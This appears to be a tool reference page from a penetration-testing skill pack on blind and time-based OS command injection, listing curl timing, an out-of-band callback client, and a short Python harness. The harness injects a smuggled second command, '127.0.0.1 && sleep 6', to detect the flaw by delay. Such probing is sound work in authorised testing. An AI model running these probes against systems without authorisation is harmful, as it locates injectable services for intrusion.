# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`os-command-injection-blind-and-time-based`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' "https://target.example/resolve?host=127.0.0.1"` | Record per-request elapsed time to build and compare against the timing baseline | Cross-platform |
| `interactsh-client` | `interactsh-client -v` | Collect DNS and HTTP callbacks with the originating address to confirm out-of-band execution | Cross-platform |
| `python` | `python blind_timing.py` | Run repeated samples and report whether an injected sleep produces a scaling delay | Cross-platform |

## Minimal Script Shape

A timing differential harness: it times several benign runs, then a sleep-bearing run, and reports whether the median delta exceeds the noise floor, pointing to time-blind execution.

```python
import statistics
import subprocess
import time

def timed(value, runs=3):
    samples = []
    for _ in range(runs):
        start = time.perf_counter()
        subprocess.run(["./resolve_wrapper.sh", value], capture_output=True, timeout=30)
        samples.append(time.perf_counter() - start)
    return statistics.median(samples)

baseline = timed("127.0.0.1")
probe = timed("127.0.0.1 && sleep 6")
print({"baseline_s": round(baseline, 2), "probe_s": round(probe, 2),
       "delay_injected": probe - baseline > 4})
```
